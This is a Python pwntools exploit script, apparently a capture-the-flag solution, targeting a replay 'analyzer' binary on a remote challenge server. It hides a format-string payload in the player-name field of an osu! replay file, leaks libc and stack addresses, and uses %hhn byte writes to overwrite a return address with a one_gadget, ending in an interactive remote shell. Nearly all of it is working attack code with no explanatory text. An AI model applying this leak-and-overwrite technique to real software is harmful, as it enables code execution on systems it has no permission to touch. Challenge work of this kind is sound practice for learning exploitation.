from pwn import *

context.binary = './analyzer_patched'
#context.log_level = 'debug'

e = ELF('./analyzer_patched',checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.35.so', checksec=False)


p = process(e.path)
p = remote('chal.osugaming.lol', 7273)

file = open('replay.osr', 'rb')
replay = file.read()

def modify_replay(data):
    data = data.ljust(0x30, b'Z')
    return replay.replace(b'%llxg Woo Yeong', data)

def send(data):
    payload = modify_replay(data).hex()
    p.recvuntil(b'Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):')
    p.sendline(payload.encode())
    p.recvuntil(b'Player name: ')
    return p.recvline().split(b'Z')[0]

def send_no_recv(data):
    print(b'sending: '+data)
    payload = modify_replay(data).hex()
    p.recvuntil(b'Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):')
    p.sendline(payload.encode())
    p.recvuntil(b'Player name: ')

def write_addr(addr,payload):
    for i in range(6):
        frmt = f'%{payload[i]}c%16$hhn'.ljust(16,' ').encode() + p64(addr+i)
        send_no_recv(frmt)

#for i in range(1,0x50):
    #libc = ELF('./libc.so.6', checksec=False)
    #leak = send(b'%'+str(i).encode()+b'$llx')
    #print(leak)
    #leak = int(leak, 16)
    #libc.address = leak - libc.symbols['__libc_start_main']
    #print(f'({i})'+hex(libc.address))
    #print()

#15th parameter is buffer

leak = send(b'%71$llx')
print(leak)
leak = int(leak, 16)
libc.address = leak - libc.symbols['__libc_start_main'] - 128
print('libcAddress: ' + hex(libc.address))
writable_address = send(b'%72$llx')
writable_address = int(writable_address, 16)
print('writableAddress: ' + hex(writable_address))
addr_to_write = writable_address - 0x88
print('addr_to_write: ' + hex(addr_to_write))
one_gadget = libc.address + 0xebc85


send_no_recv(b'%10c%16$hhn'.ljust(16,b' ')+p64(addr_to_write))
addr_to_write -= 160
write_addr(addr_to_write, p64(writable_address))
write_addr(addr_to_write+8,p64(one_gadget))
p.sendline(b'\n')
p.interactive()
